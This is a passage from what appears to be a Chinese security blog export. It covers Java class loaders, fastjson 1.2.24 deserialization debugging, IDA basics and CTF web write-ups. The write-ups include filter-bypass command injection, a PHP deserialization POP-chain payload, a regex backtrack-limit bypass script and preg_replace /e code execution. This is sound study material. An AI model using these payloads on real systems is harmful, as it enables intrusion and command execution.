java.io.IOException;\npublic class CMD {\n\n    public static Process exec(String cmd) throws IOException {\n        return Runtime.getRuntime().exec(cmd);\n    }\n\n}\n```\n\n## **类加载隔离**\n\n创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。\n\n也就是同级类加载器不能使用另外一个类加载器load的类。只能通过反射调用\n\n**跨类加载**\n\n  跨类加载器调用类方法时需要特别注意一个基本原则：`ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射`\n\n```java\npackage com.anbai.sec.classloader;\nimport java.lang.reflect.Method;\nimport static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_BYTES;\nimport static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_NAME;\npublic class TestCrossClassLoader {\n    public static class ClassLoaderA extends ClassLoader {\n       public ClassLoaderA(ClassLoader parent) {\n            super(parent);\n        }\n        {\n            // 加载类字节码\n            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);\n        }\n    }\n    public static class ClassLoaderB extends ClassLoader {\n        public ClassLoaderB(ClassLoader parent) {\n            super(parent);\n        }\n        {\n            // 加载类字节码\n            defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);\n        }\n    }\n    public static void main(String[] args) throws Exception {\n        // 父类加载器\n        ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();\n        // A类加载器\n        ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);\n        // B类加载器\n        ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);\n        // 使用A/B类加载器加载同一个类\n        Class<?> aClass  = Class.forName(TEST_CLASS_NAME, true, aClassLoader);\n        Class<?> aaClass = Class.forName(TEST_CLASS_NAME, true, aClassLoader);\n        Class<?> bClass  = Class.forName(TEST_CLASS_NAME, true, bClassLoader);\n        // 比较A类加载和B类加载器加载的类是否相等\n        System.out.println(\"aClass == aaClass：\" + (aClass == aaClass));\n        System.out.println(\"aClass == bClass：\" + (aClass == bClass));\n        System.out.println(\"\\n\" + aClass.getName() + \"方法清单：\");\n        // 获取该类所有方法\n        Method[] methods = aClass.getDeclaredMethods();\n        for (Method method : methods) {\n            System.out.println(method);\n        }\n        // 创建类实例\n        Object instanceA = aClass.newInstance();\n        // 获取hello方法\n        Method helloMethod = aClass.getMethod(\"hello\");\n        // 调用hello方法\n        String result = (String) helloMethod.invoke(instanceA);\n        System.out.println(\"\\n反射调用：\" + TEST_CLASS_NAME + \"类\" + helloMethod.getName() + \"方法，返回结果：\" + result);\n    }\n}\n```\n\n输出结果\n\n```text\naClass == aaClass：true\n        aClass == bClass：false\n\n        com.anbai.sec.classloader.TestHelloWorld方法清单：\npublic java.lang.String com.anbai.sec.classloader.TestHelloWorld.hello()\n\n        反射调用：com.anbai.sec.classloader.TestHelloWorld类hello方法，返回结果：Hello World~\n```\n\n## **JSP自定义类加载类型的后门**\n\n  以`冰蝎`为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的`equals`方法实现恶意攻击，其中`equals`方法传入的`pageContext`对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。\n\n## **BCEL字节码加载**\n\n未完待续....\n\n\n\n\n\n\n\n参考：https://javasec.org/javase/ClassLoader/ ","tags":["web安全","java安全"]},{"title":"fastjson反序列化解析过程调试","url":"/2023/12/05/fastjson反序列化调试/","content":"\n\n\n\n\n# fastjson反序列化解析过程调试\n\n\n\n简单水一下fastjson反序列化解析过程的调试\n\n\n\n## 介绍\n\n​    fastjson是阿里巴巴开源的java中解析json的一个组件。其功能就是将json字符串与java对象进行相互转化。正如其名，解析j转化速度很快\n\n\n\n​     但fastjson多个版本都爆出反序列化漏洞，因此当遇到json时，可以看是否用了fastjson，再测是否存在漏洞\n\n​\t当json中含有@type字段时，fastjson会将json解析为对应类的对象\n\n\n\n​\t本篇文章主要是fastjson在反序列化解析的调试\n\n## 调式的代码\n\n**环境**：\n\n- jdk8\n- fastjson 1.2.24\n\n\n\n导入（pom.xml）\n\n```xml\n    <dependency>\n      <groupId>com.alibaba</groupId>\n      <artifactId>fastjson</artifactId>\n      <version>1.2.24</version>\n    </dependency>\n```\n\n\n\n\n\n自定义的恶意类\n\n```java\npackage org.example.enity;\n\nimport java.io.IOException;\nimport java.util.Map;\n\npublic class Test {\n    private Map mymap;\n    public Test(){\n        System.out.println(\"调用了构造方法\");\n    }\n    static {\n        System.out.println(\"调用了静态代码块\");\n    }\n    public void setCmd(String cmd) throws IOException {\n        System.out.println(\"调用了set方法\");\n        Runtime.getRuntime().exec(cmd);\n    }\n\n\n    public String getCmd(){\n        System.out.println(\"调用了get方法\");\n        return \"get\";\n    }\n\n    public Map getMymap() {\n        return mymap;\n    }\n}\n```\n\n​      这里并不是标准的JavaBean,没有cmd属性，但有setCmd方法\n\n调试代码\n\n```java\nString s=\"{\\\"@type\\\":\\\"org.example.enity.Test\\\",\\\"cmd\\\":\\\"calc\\\"}\";\nJSONObject student=JSON.parseObject(s);\n```\n\n## JSON.*parseObject方法*\n\n   这次是以*parseObject的过程。parse方法稍微有些不同* \n\n具体代码\n\n<img src=\"/img/12-4/2.png\">\n\n1. #### 初步解析\n\n 可以看出，第一步就是反序列化得到一个obj对象，后面会将该对象转为JSON对象\n\n那么整个反序列化和解析逻辑都在这个parse方法中\n\n2. #### 进入parse方法:\n\n具体解析的函数是在JSON类中的parse方法\n\n<img src=\"/img/12-4/1.png\">\n\n前面的就是简单解析进行初始化，将json字符串封装到parser对象中\n\n3. #### 进入JSON类中的parse方法：\n\n前面几层套娃(...)，到这里开始解析左边界，\n\n<img src=\"/img/12-4/3.png\">\n\n当解析到{时,会返回一个对象\n\n4. #### 然后继续进入parseObject方法：\n\n首先会进行类加载\n\n<img src=\"/img/12-4/4.png\">\n\n   \t类加载的时候，会判断是否是一些特殊的类，然后在从从默认加载的类中寻找，如果没有才会用类加载器加载，如下\n\n<img src=\"/img/12-4/5.png\">\n\n<img src=\"/img/12-4/6.png\">\n\n那么我们给出的类就已经加载到内存了\n\n后面的步骤就是获取反序列化器，和进行反序列化了\n\n<img src=\"/img/12-4/7.png\">\n\n5. #### 进入ParserConfig类中的getDeserializer方法：\n\n首先查询是否为已经加载的反序列化器和默认类反序列化器\n\n<img src=\"/img/12-4/8.png\">\n\n<img src=\"/img/12-4/9.png\">\n\n最后创建一个反序列化器，并将其放入derializers中，表示已经加载的反序列化器\n\n<img src=\"/img/12-4/10.png\">\n\n6. #### 进入createJavaBeanDeserializer方法：\n\n在里面会创建一个JavaBeanInfo对象\n\n\n\n### 获取getter和setter\n\n其实这一个函数才是本次调试的核心方法\n\n<img src=\"/img/12-4/11.png\">\n\n跟进build方法，首先可以看到使用反射获取我们给的类的方法属性和方法\n\n<img src=\"/img/12-4/12.png\">\n\n- 获取所有setXXX(标准javaBean中存在的方法)\n\n​         遍历方法数组，选取出符合条件的方法\n\n下图为部分代码截图\n\n<img src=\"/img/12-4/13.png\">\n\n筛选条件：\n\n- 方法名长度>=4\n- 不能是静态方法\n- 不能是无参函数，且必须有返回\n- 参数个数为1\n- 方法名必须以set开头\n- 不能有注解\n\n​        根据这些条件能够选出setXXX，不一定是javaBean中的setXXX，只要满足条件就行（比如我定义的恶意类setCmd函数）\n\n​    根据这点，后面的fastjson反序列漏洞寻找能利用的方法。\n\n然后根据方法推断出属性名\n\n​    类似的获取getXXX\n\n<img src=\"/img/12-4/14.png\">\n\n\n\n筛选条件\n\n- 非静态方法\n- 无参数\n- 返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong\n\n\n\n\n\n如果按照普通的类（没有像调式代码的类一样）就会进入下面方法 \n\n*最后根据前面获取的东西，构造JavaBeanInfo对象（会把一些构造器啥的丢进去）*\n\n<img src=\"/img/12-4/15.png\">\n\n​        *然后会根据JavaBeanInfo对象构造反序列化器*\n\n*进入ASMDeserializerFactory类中的createJavaBeanDeserializer：*\n\n​        这就是最后构造反序列化器的函数(晕*\n\n<img src=\"/img/12-4/16.png\">\n\n*这里开始会进行初始化操作，对象类名设置为fastjson自定义的类名*\n\n*然后反射newInstance构造一个实例返回*\n\n*至此原来的createJavaBeanDeserializer函数结束。*\n\n\n\n\n\n\n\n整个获取反序列器的步骤结束\n\n\n\n7. #### 利用反序列化器进行反序列化\n\n<img src=\"/img/12-4/17.png\">\n\n​        发现后面代码调试不了，这是因为前面*ASMDeserializerFactory*  是用利用ASM重新生成类(ASM操作字节码),因为这个反序列化器类是代码生成的，在内存中，所以无法使用idea调试后面的反序列化操作 \n\n<img src=\"/img/12-4/18.png\">\n\n\n\n### 解决不能调试\n\n查看在最后之前的代码\n\n<img src=\"/img/12-4/20.png\">\n\n\n\n​          起初asmEnable为 true,会走下面代码（也就是前面不能调式的代码）。如果asmEnable是false,就会直接创建一个JavaBean反序列化器（就不需要使用ASM创建一个临时的类了）。这样，后面代码可以继续调试。 \n\n\n\n这里有几种方式 \n\n<img src=\"/img/12-4/21.png\">\n\n\n\n​         发现getOnly为true更适合（其他的是要求 ： 类是非public、要是一个接口、属性个数大于200）\n\n查找getOnly，发现只有一处为false\n\n是一个Feildinfo的构造方法\n\n<img src=\"/img/12-4/22.png\">\n\n\n\n  这里看出方法的参数个数不能为1\n\n发现只有在前面JaavaBean.build的时候\n\n  遍历获取getter方法的时候，才满足条件\n\n<img src=\"/img/12-4/23.png\">\n\n进入if后，会调用这个new FeildInfo时进入上面的设置getOnly为true \n\n```java\nadd(fieldList, new FieldInfo(propertyName, method, null, clazz, type, 0, 0, 0, annotation, null, null));\n```\n\n这里进入if就行了\n\n​      这里是要方法的返回值是这些类中的其中一个，只有前面两个好实现,collection类和map类\n\n​     除此之外，也不能有之对应的setxxx，如果存在，就不会在getxxx(第二次循环时候)被解析\n\n\n\n**综上**：\n\n​         类中需要一个返回类型是map类型getxxx方法（且不能有对应的setxxx），才能对后续代码进行调试\n\n因此调试代码中有mymap属性和getMymap方法\n\n\n\n**然后继续**\n\n进入默认的反序列化器JavaBeanDeserializer中进行反序列化，其中下面代码会触发setXXX方法\n\n<img src=\"/img/12-4/24.png\">\n\n后面也没什么了，出反序列化方法\n\n\n\n如果是parseObject方法。 最后会进行json对象的序列化\n\n<img src=\"/img/12-4/25.png\">\n\n\n\n   然后使用JavaBeanSerializer序列化成json对象\n\n在其中，会调用所有属性的getter方法\n\n<img src=\"/img/12-4/26.png\">\n\n\n\n这里是使用反射调用的getter方法 \n\n<img src=\"/img/12-4/27.png\">\n\n\n\n## 总结\n\n通过调试可以发现\n\nJSON.*parseObject方法是*\n\n- 会先会获取反序列化器，同时通过反射获取所有的setXXX和getXXX\n- 将所有属性和值放入反序列化器\n- 反序列化的时候会调用该属性的setXXX设置对象属性\n- 若是parseObject方法（除去parse方法），会转为json对象时会调用getter方法\n\n因此上面我们的代码中\n\n​            我们定义的类没有cmd属性，但我们传入cmd键时，反序列化时触发setcmd方法，因此造成了命令执行。\n\n\n\n除此，也要区分parse和parseObject，前者不会触发getXXX \n\n\n\n​         最后，想说好久没更新了文章了。主要是最近好一段时间都没怎么深入投入学习，并有各种事情忙。（我想立flag了\n\n初识java安全，确实我也是小白","tags":["web安全","java安全","反序列化","fastjson"],"categories":["java安全"]},{"title":"IDA的使用与re浅浅入门","url":"/2023/11/06/IDA的使用与re浅浅入门/","content":"\n\n\n\n\n\n\n# IDA的使用与re浅浅入门\n\n## 界面介绍\n\n- 左侧是函数窗口，显示一些函数，可以crtf+f寻找main函数,找到主程序\n\n<img src=\"/img/11-6/2.png\" height=\"500px\">\n\n- 主体是汇编代码，可以通过空格切换查看视图\n\n<img src=\"/img/11-6/3.png\" >\n\n- 内存分段，直接明了看所在内存的位置\n\n<img src=\"/img/11-6/4.png\">\n\n## 常用快捷键\n\n- F5键--反汇编，，转化为伪C代码\n\n<img src=\"/img/11-6/5.png\"> \n\n- shift+F12 切换到字符串展示界面(String Window)所有字符串在这里显示\n\n<img src=\"/img/11-6/6.png\"> \n\n- crtf+X 交叉引用 寻找数据被引用的地方\n\n<img src=\"/img/11-6/7.png\"> \n\n- g键 跳转到地址处\n\n<img src=\"/img/11-6/8.png\"> \n\n- alt+t  搜索指令\n\n<img src=\"/img/11-6/9.png\"> \n\n<img src=\"/img/11-6/10.png\"> \n\n- n键对函数进行重命名\n\n<img src=\"/img/11-6/11.png\"> \n\n- ctrl+z撤销操作\n\n**数据操作**\n\n- d键转化数据格式，h结尾代表十六进制\n\n<img src=\"/img/11-6/1.png\"> \n\n- a键转化为字符串\n- c键转化为汇编代码\n- u键转化为原始形式\n- shift+e导出选定数据\n- 对在程序中一些数据右键可以改变其数据类型，原始的char是数字的形式\n\n<img src=\"/img/11-6/12.png\"> \n\n- ctrl+e进入程序起始位置\n\n\n\n## BUUCTF re前三题\n\n### **easyre1**\n\n将程序拖入IDA,很好进来就是main函数\n\n<img src=\"/img/11-6/13.png\">\n\nF5,反汇编一下，得到flag ,flag{this_Is_a_EaSyRe}\n\n<img src=\"/img/11-6/14.png\">\n\n\n\n###    **reverse1**\n\n一进来不是主函数，尝试在左边找到main，没找到 (\n\nshift+F12 查看所有字符串，找到关键字符串this is the right flag!\n\n<img src=\"/img/11-6/15.png\">\n\n双击进入\n\n<img src=\"/img/11-6/16.png\">\n\nctrl+x找到引用函数 ，再F5反汇编\n\n<img src=\"/img/11-6/18.png\">\n\n右键hide cast，隐藏标记以防看不懂\n\n可以对一些熟悉的函数进行重命名，如sub_1400111D1就是printf函数\n\n这里主要是对我们输入的字符串与Str2对比，如果一样就输出this is the right flag!，表明我们输入了正确的flag\n\n那我们就看看此时的Str2是什么，他就是flag\n\n<img src=\"/img/11-6/19.png\"> \n\n双击进入，发现是{hello_world}\n\n但返回刚才代码发现，程序对原始的Str2进行了修改\n\n将某些数字改为字符类型，更为直白\n\n<img src=\"/img/11-6/20.png\">\n\n最后看这程序，是把Str2中的o改为0\n\n<img src=\"/img/11-6/21.png\">  \n\n因此最后flag为flag{hell0_w0rld}\n\n###  **reverse2**\n\n这个题目和上面的类似，不过一进来就是main函数，不要找了)\n\nF5反汇编，跟上面的一样的逻辑\n\n<img src=\"/img/11-6/22.png\"> \n\n这里主要是flag变量\n\n将前面修改flag的代码中的字符类型数据转化一下\n\n<img src=\"/img/11-6/23.png\"> \n\n这里主要是将flag中的i和r改为1\n\n双击flag变量，查看内容\n\n发现这里没有显示全\n\n<img src=\"/img/11-6/24.png\"> \n\n选中按下a，变为字符串\n\n<img src=\"/img/11-6/25.png\"> \n\n更改字符\n\n得到最后flag,flag{hack1ng_fo1_fun}","tags":["二进制","re入门","工具使用"]},{"title":"创建和配置Servlet项目","url":"/2023/10/15/创建和配置Servlet项目/","content":"\n\n\n## 创建和配置Servlet项目\n\nservlet是原生的javaweb\n\n这里学习javaweb时候，配置Servlet项目，idea社区版怎么手动配置Servlet项目,于是就搞了一个教程,也是算入坑javaweb了\n\n##### **1.创建一个项目**\n\n<img src=\"/img/9-8/1.png\"> \n\n##### **2.添加web模块**\n\n\n\n先选择创建的项目，打开模块设置\n\n<img src=\"/img/9-8/2.png\"> \n\n\n\n在模块中选中自己的项目，添加web模块\n\n<img src=\"/img/9-8/3.png\"> \n\n然后确定\n\n<img src=\"/img/9-8/4.png\"> \n\n##### **3.配置web模块**\n\n在生成的web目录下的WEB-INF目录下创建classes目录，用于存放编译后的文件\n\n<img src=\"/img/9-8/5.png\"> \n\n再次打开模块设置，在模块中选择我们的项目，设置输出路径，将两个路径改为刚创建好的classes目录\n\n<img src=\"/img/9-8/6.png\"> \n\n点击修正，然后创建一个工件\n\n<img src=\"/img/9-8/7.png\"> \n\n最后确定\n\n<img src=\"/img/9-8/8.png\"> \n\n##### **4.配置Tomcat启动项**\n\n打开运行配置\n\n<img src=\"/img/9-8/9.png\"> \n\n添加Tomcat配置\n\n<img src=\"/img/9-8/10.png\"> \n\n配置Tomcat,配置好Tomcat的安装路径\n\n<img src=\"/img/9-8/11.png\"> \n\n添加部署，选择刚设置好的工件\n\n<img src=\"/img/9-8/12.png\"> \n\n最后确定，当然也可以设置其他东西，如上下文，端口等等\n\n<img src=\"/img/9-8/13.png\"> \n\n##### **6.引入外部jar包**\n\n打开模块设置，添加Tomcat安装目录下的lib目录下的servlet-api.jar\n\n这里也可以在web目录下创建lib目录,来放置导入的包!\n\n<img src=\"/img/9-8/14.png\"> \n\n##### **7.启动简单的实例**\n\n在web目录下，创建index.jsp,然后运行服务器\n\n<img src=\"/img/9-8/15.png\"> \n\n成功输出\n\n\n\n<img src=\"/img/9-8/16.png\"> \n\n编写Servlet程序，在src目录下创建一个软件包，编写一个java程序测试一下\n\n```\npackage com.my;\n\nimport jakarta.servlet.Servlet;\nimport jakarta.servlet.annotation.WebServlet;\nimport jakarta.servlet.http.HttpServlet;\nimport jakarta.servlet.*;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\n\n\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\n@WebServlet(name = \"test\")\npublic class Helloserver extends HttpServlet implements Servlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n    }\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException, IOException {\n\n        response.setContentType(\"text/html\");\n\n        PrintWriter out = response.getWriter();\n\n        out.println(\"this is a test!\");\n    }\n\n}\n```\n\n<img src=\"/img/9-8/17.png\"> \n\n然后编辑web.xml文件，如下设置\n\n<img src=\"/img/9-8/18.png\"> \n\n然后重新启动服务器访问\n\n这里的url与我们配置的相对应\n\n<img src=\"/img/9-8/19.png\"> \n\n继续开启javaweb之旅(^-^)","tags":["java"]},{"title":"2023SHCTF之web的wp","url":"/2023/10/03/2023SHCTF之web的wp/","content":"\n\n\n\n\n[TOC]\n\n\n\n# 2023 SHCTF web wp[week 1]\n\n说明：可能稍微啰嗦了亿点,面向新生，放心慢慢食用,\n\n\n\n下面前言可跳过（纯多bb了一下）\n\n## **前言**\n\n首先说web的话是应用层，所以会基本看不到底层的东西(包括c语言/c++)。对于ctf的话，web这块的内容，熟悉HTTP协议（知道计算机质之间是如何传递数据的），html.javaScript（前端语言）是必须要会一点，然后入门级的PHP也要会(比java简单多了)，然后就是Top10漏洞（其中还会涉及数据库mysql），也要知道一些常用的编码和加解密手段(Unicode、md5、base64),会这些后web也算入门了(看到这，要是我，已经当场去世)\n\n这里再说说why（hihi,装一下）：为什么要搞web 安全，在这互联网的世界，我们能享受各种各样的服务(qq聊天、刷视频)，都离不开web技术，所以web里面也有很多技术（常听的前端和后端），所以就会有许多的漏洞存在，对于企业、学校等等来说web服务器就是面向大伙大门，想要攻入内部系统，首先要拿下web服务器(bushi) ,所以web这块对于整个渗透攻击或者安全防御都重要，企业看重web这块的安全比内网多多了，这里再插一条：2021爆出的史诗级漏洞--log4j2远程代码执行漏洞(CVE-2021-44228)\n\n\n\n从易到难（前三个不好排），题解可能会不唯一，拿到flag就行，下面题目若是看不懂题解，也不要紧，把涉及的知识点记下来，以后慢慢学(hhhh)\n\n\n\n**前几题不一定要有编程基础！**\n\n## [WEEK1]登录就给flag\n\n**前置知识**：弱口令、暴力破解、（http协议、 抓包）\n\n\n\n先bb一下(这里主打一个实操):\n\n什么是弱口令：就是很容易会被猜到的口令(不一定是密码)，比如说常见的弱口令密码：123456、admin、password、000000\\...\n\n什么是暴力破解：简称爆破，大白话就是一个一个去试，当然一般不会是人工，拿着工具或者编程语言脚本去跑。\n\n拿什么去试？：一般会有人把常见的密码或者用户名等测试语句存放在一个文本文件里面，这个通常叫作字典，github上有开源的字典（一搜便是），当然 也可以自己搜集制作自己的字典\n\n\n\n这里再插一条：admin \t（后台）管理员的意思，后台管理员是网站中能够控制管理内容的角色(如别人提交发布文章、视频、监控网站等等)，有最高权限，一般就是网站登录的特殊用户（有些可能会有后台管理系统），在现实中和ctf中，无疑管理员的账号可能会是admin（有时候密码也是） 所以第一测试的用户名就是admin\n\n\n\n\n\n回到题目\n\n这题就是登录时有弱口令漏洞\n\n进入登录页面\n\n<img src=\"/img/10-3/5.png\">\n\n上面bb了，这里username用户名直接测试admin\n\n至于密码，开头可以首测几个弱口令 ，运气好就测出来了（hhh）、本题弱口令密码--password（我是没那运气），登录成功后就有flag\n\n<img src=\"/img/10-3/6.png\">\n\n\n\n下面进入常规的爆破密码解法（没运气的看这边）\n\n这里我用的工具是Burp Suite  (web和渗透必备)，没安的kali上面自带，安装需要java环境（burp安装稍微复杂，但必备）\n\n使用burp抓包送至Intruder模块进行暴力破解(b站上有教程)，并对我们输入的密码部分进行标记(标记后前后都会有$)\n\n<img src=\"/img/10-3/7.png\">\n\n设置payload(不想解释了)，点load加载字典文件（自己网上搜），若右边有内容说明加载成功，说明加载成功，最后点击Start attack开始攻击\n\n<img src=\"/img/10-3/8.png\">\n\n等他跑完，最后可以根据Status code（状态码）和Length（返回长度）找出那与众不同的那条，发现password就是密码，拿去登录拿flag\n\n<img src=\"/img/10-3/9.png\">\n\n\n\n## [WEEK1]生成你的邀请函吧~\n\n前置知识：http协议、json*\n\n\n\n这个题，题目描述就告诉我们该怎么做了\n\n<img src=\"/img/10-3/10.png\">\n\n根据他的描述请求就行。请求接口为generate_invitation\n\n实体类型：application/json\n\n请求方式为POST、请求实体就是上面的Body，这里其实就是一个标准的请求接口，传递json数据，获得一张图片\n\n下面分别展示插件Ha\n\n\n\nckbar和Burp Suite抓包改包(选一个有的就行)\n\nHackbar\n\n1.设置URL    2.设置POST请求  \t3.设置类型为json数据         4.加上json数据\n\n<img src=\"/img/10-3/11.png\">\n\nBurp Suite\n\n抓包，然后改成这样，再放包\n\n<img src=\"/img/10-3/12.png\">\n\n\n\n最后打开图片，flag就在下面\n\n<img src=\"/img/10-3/13.png\">\n\n## [WEEK1]飞机大战\n\n**前置知识**：html、javascript、unicode编码、base64\n\n右键查看源代码 ，找到引用的js文件，点击查看js文件源码\n\n<img src=\"/img/10-3/1.png\">\n\n看到这个函数，应该是游戏赢了后执行的，里面有一窜奇怪的字符\n\n<img src=\"/img/10-3/2.png\">\n\n这串字符其实就是unicode编码，十有八九就是flag,将其进行解码\n\n<img src=\"/img/10-3/3.png\">\n\n拿到：ZmxhZ3s0MzAxMTk1ZS05MWE5LTQ0Y2ItYjk4NC0wMjQ4ZGQ3MWRhYTB9\n\n好家伙，搁这玩套娃(出题人出来挨打)，这层实际是base64加密，这些加解密，网上都有在线的\n\n再解base64，得到flag\n\n<img src=\"/img/10-3/4.png\"> >\n\n\n\n**接下来的题目需要会编程语言（PHP）、漏洞基础！**\n\nPHP是世界上最好的语言.......十分合理（hh),比java简单多了(虽然现在java是主流，不建议入门就学)\n\n\n\n## [WEEK1]babyRCE\n\n**前置知识:**  http协议、 php入门，Linux系统命令(会查看编辑文件、熟悉目录结构)，  代码执行漏洞(RCE)以及相关绕过和防御、正则表达式\n\n首先不得不说现在的服务器（古老的除外）。都基本是Linux，所以涉及这个漏洞的时候就要熟悉Linux指令\n\n这题纯粹的RCE，这题解法应该有很多，说其中一种\n\n<img src=\"/img/10-3/14.png\">\n\n代码解析：首先获取GET传参rce，然后对我们传的参数进行了正则过滤、没有过滤字符才会把我们传的参数进行系统命令执行\n\n它过滤了cat 、more、less、ead、tac、tail、nl、od、vi、vim、sort、flag|、;|0-9、*、`、%、>、<、'、\" 还有空格\n\n首先ls查看当前web目录下的文件\n\n<img src=\"/img/10-3/15.png\">\n\n这些就不能直接出现我们输入的参数里面。空格这里用%09代替(tab键的url编码)\n\ncat和flag 再其中加入\\就行 ,?rce=c\\at%09./f\\lag.php\t\t查看flag.php文件\n\n<img src=\"/img/10-3/16.png\">\n\n看不到内容，查看源代码\n\n<img src=\"/img/10-3/17.png\">\n\n好好好，被出题人给骗了（出来受打）看看根目录有没有flag\n\n<img src=\"/img/10-3/18.png\">\n\n\n\n**到后面应该算得上中等题了，这里知识储备就多了,好好好，这是新生赛**\n\n## [WEEK1]ez_serialize\n\n**前置知识**：PHP类与对象、PHP魔术方法、PHP反序列化漏洞、POP链、文件包含漏洞、php伪协议\n\n\n\nPHP反序列化的题主打一个代码审计（看代码），好好好，代码多的时候当场去世\n\n,先马代码，序列化和反序列化不多说了,主打套娃反复横跳\n\n<img src=\"/img/10-3/19.png\">\n\n这里代码审计和魔术方法不多说了，说下pop利用链\n\n1.最外层是B类的对象，触发__wakeup方法,\n\n2.q属性是C类的实例对象,触发__toString方法\n\n3.C中属性var是D类的实例对象，触发__get方法\n\n4.D中的属性p是A类的实例对象，触发__inovke方法\n\n5.A中属性var_1是我们要包含的文件；最后利用文件包含漏洞\n\n这里利用php://filter和文件包含漏洞来读取flag.php文件\n\n上序列化代码\n\n```php\n<?php\nclass A\n{\n    public $var_1;\n}\nclass B\n{\n    public $q;\n}\nclass C\n{\n    public $var;\n    public $z;\n}\nclass D\n{\n    public $p;\n}\n$b = new B();\n$c = new C();\n$d = new D();\n$a = new A();\n$a->var_1 = \"php://filter/read=convert.base64-encode/resource=flag.php\";\n$d->p = $a;\n$c->z = $d;\n$b->q = $c;\necho serialize($b);\n```\n\n执行上面代码得到序列化字符串\n\n```reStructuredText\nO:1:\"B\":1:{s:1:\"q\";O:1:\"C\":2:{s:3:\"var\";N;s:1:\"z\";O:1:\"D\":1:{s:1:\"p\";O:1:\"A\":1:{s:5:\"var_1\";s:57:\"php://filter/read=convert.base64-encode/resource=flag.php\";}}}}\n```\n\n得到文件内容, PD9waHANCiRmbGFnID0gImZsYWd7NzZmZmExNWYtY2YxOS00ZTMwLTk3ZDEtNTdlMmQ5Yjg3MDJlfSI7DQo=    进行base64解密得到flag    \n\nflag{76ffa15f-cf19-4e30-97d1-57e2d9b8702e}\n\n<img src=\"/img/10-3/20.png\">\n\n\n\n\n\n## [WEEK1]1zzphp\n\n**前置知识**：正则表达式、php代码审计、php正则函数绕过、(python)\n\n这里顺便提一下PHP的弱类型比较，可以学习学习\n\n这题真不一定能get到（出题人出来挨打），遇到的才有思路（我也学到了）\n\n\n\n首先代码审计，主要分为两部分\n\n<img src=\"/img/10-3/21.png\">\n\n第一部分：正则过滤了num中的数字，但没有数字无法进入下一部分\n\n这里给num传个数组(?num[]=1)就行，preg_match 遇到数组会返回null\n\n第二部分：c_ode需要2023SHCTF ，但又不能出现SHCTF,\n\n这里只能绕过preg_match函数\n\n\n\n需要补充知识：\n\n看看大佬p神的文章：[PRCE回溯攻击](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)\n\n总之一句话：超长字符串引发php安全机制，从而绕过preg_match 函数\n\n上python脚本自动构造超长字符(好好好，这题c_ode长度达到了1000000的级别才行)\n\n```python\nimport requests\n#pip 安装一下库\n#改成自己题目的url\nurl=\"http://112.6.51.212:30932/\"\ndata={\n    \"c_ode\":\"s\"*1000000+\"2023SHCTF\"\n}\nres=requests.post(url+\"?num[]=1\",data).text\nprint(res)\n```\n\n运行代码，最后得到flag\n\n<img src=\"/img/10-3/22.png\">\n\n\n\n## [WEEK1]ezphp\n\n**前置知识**：php、代码执行漏洞、phpinfo、正则表达式、preg_replace代码执行\n\n好好好，做到这个题，原来我也是新生(太菜了，呜呜~)\n\n上题目\n\n<img src=\"/img/10-3/23.png\">\n\n前面正则过滤了好多东西，暂且不管，这题只要出phpinfo页面就行了\n\n关键是圈出部分\n\n这个我见的少(可能是第二次见)，直接码文章：\n\n[深入研究preg_replace与代码执行 | Mochazz's blog](https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/) \n\npreg_replace这个函数原本是利用正则表达式替换符合条件的字符串，但是这个函数有一个功能——`可执行命令`。这个函数的第一个参数是正则表达式，按照PHP的格式，表达式在两个“/”之间。如果我们在这个表达式的末尾加上“e”，那么这个函数的第二个参数就会被当作代码执行。 \n\n总之，/e模式下正则表达式代码执行（这里可以用在php的一句话木马中）\n\n解析题目代码：\n\npattern为匹配模式，code为匹配字符串，\\\\1 其实是一个引用，指向code参数\n\n上payload\n\n<img src=\"/img/10-3/24.png\">\n\ncode为格式{${要执行的代码}}（官方payload就是这样的，我也没深入研究，先拿来用） 只要匹配成功就能执行code代码，所以pattern为（.*），意为匹配所有。\n\n匹配成功后执行代码，显示phpinfo页面\n\n再ctrl+f 搜索flag就能找到flag\n\n<img src=\"/img/10-3/25.png\">\n\n\n\n\n\n## 后话\n\n新生赛，也大概体会了一下ctf，不仅局限于ctf,学web和二进制等方向还是看自己兴趣，凭着ctf也可以研究好web安全(前期)\n\nweb方向确实面向现实一点，是渗透测试的基础，web安全方向知识的也会常常出现在绝大多安全岗位的面试题\n","tags":["ctf入门","新生赛wp","web安全"]},{"title":"2023MoeCTF之web的wp","url":"/2023/09/12/2023MoeCTF之web的wp/","content":"\n\n\n\n\n# [2023 MoeCTF] WEB wp\n\n环境有问题，我开始还能用自己ip访问，后面突然不行了，这导致不能抓取本地的包，没关系照样做(^-^)\n\n# http\n\n签到题一\n\n<img src=\"\\img\\9-12\\7.png\" 